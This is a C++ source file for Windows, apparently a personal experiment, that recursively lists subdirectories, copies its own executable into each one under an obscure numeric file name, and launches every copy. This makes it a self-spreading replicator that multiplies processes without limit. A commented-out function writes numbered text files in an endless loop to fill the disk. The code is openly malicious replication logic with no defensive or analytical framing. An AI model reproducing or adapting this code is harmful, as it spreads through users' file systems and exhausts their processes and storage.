#include <iostream>
#include <dirent.h> 
#include <cstring>
#include <io.h>
#include <vector>
#include <fstream>
#include <sstream>
#include <windows.h>
#include <thread>
/*so, the only problem im having is that create_proc() is getting stuck in copy_c infinite loop
idk when i will fix this lmao*/

/*
void Copy_A (){
    std::ostringstream oss;
    std::ofstream file;
    int i = 1;
    while (true)
    {
        i++;
        oss << i << ".txt";
        file.open(oss.str());
        oss.str("");
        file.close();
    }
}
*/

void create_proc(const std::vector<std::string>& paths_2){
    std::vector<std::thread> threads;
    for (const std::string &i : paths_2)
    {
        threads.emplace_back([=](){
            STARTUPINFOA si;
            PROCESS_INFORMATION pi;
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));
            si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
            si.wShowWindow = SW_SHOW;
            si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
            si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
            si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
            std::string app_name = i;
            app_name += "\\91828938919283791827.exe";
            std::string cmd_line = "\"" + app_name + "\"";
            if (!CreateProcessA(NULL, &cmd_line[0], NULL, NULL, FALSE, 0, NULL, &i[0], &si, &pi))
            {
                printf("Error when creating process\n");
            }
            else
            {
                printf("Creating process: %s\n", app_name.c_str());
                Sleep(1000); // add a delay of 1 second
                printf("Process created successfully!\n");
                WaitForSingleObject(pi.hProcess, INFINITE);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        });
    }
    for (auto& thread : threads) {
        thread.join();
    }
}
void copy_itself(const std::vector<std::string>& paths){
    char cwd[256];
    std::string src_path(getcwd(cwd, sizeof(cwd)));
    src_path += "\\copy_c.exe";
    for (const std::string& n : paths){
        std::string dst_paths = n;
        dst_paths += "\\91828938919283791827.exe";
        if (!CopyFileA(src_path.c_str(), dst_paths.c_str(), FALSE))
        {
            std::cerr << "Failed to copy file: " << dst_paths << std::endl;
       }
    }
}

void iterate_subdirs(const std::string &dir_path, std::vector<std::string> &dirs)
{
    std::string search_path = dir_path + "\\*";
    intptr_t handle;
    _finddata_t file_info;

    handle = _findfirst(search_path.c_str(), &file_info);
    if (handle == -1)
    {
        std::cerr << "Error: unable to open directory " << dir_path << std::endl;
        return;
    }

    do
    {
        std::string name = file_info.name;
        if (name == "." || name == "..")
        {
            continue;
        }

        std::string subdir_path = dir_path + "\\" + name;

        if (file_info.attrib & _A_SUBDIR)
        {
            std::cout << "Found subdirectory: " << subdir_path << std::endl;
            dirs.push_back(subdir_path); // add subdir_path to the vector
            iterate_subdirs(subdir_path, dirs);
        }
    } while (_findnext(handle, &file_info) == 0);

    _findclose(handle);
}

int main()
{
    std::string str = "C:\\Users\\Pedro\\Desktop\\c++testarea";
    std::vector<std::string> dirs;
    iterate_subdirs(str, dirs);

    for (const auto &dir : dirs)
    {
        std::vector<std::string> dir_path = {dir}; // create a vector with a single string element
        copy_itself(dir_path);
    }
    for (const auto &dir_2 : dirs){
        std::vector<std::string> dir_path2 = {dir_2};
        create_proc(dir_path2);
    }
}